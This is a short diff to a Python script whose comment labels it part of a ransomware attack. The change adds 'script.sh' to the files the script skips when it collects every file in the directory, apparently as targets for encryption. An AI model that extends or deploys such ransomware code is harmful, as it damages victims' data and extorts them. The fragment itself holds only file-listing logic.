@@ -6,7 +6,7 @@ files = []
 
 # Ignoring the ransomware attack files
 for file in os.listdir():
-  if file == "thekey.key" or file == "supersafe.py":
+  if file == "thekey.key" or file == "supersafe.py" or file == "script.sh":
     continue
   if os.path.isfile(file):
     files.append(file)
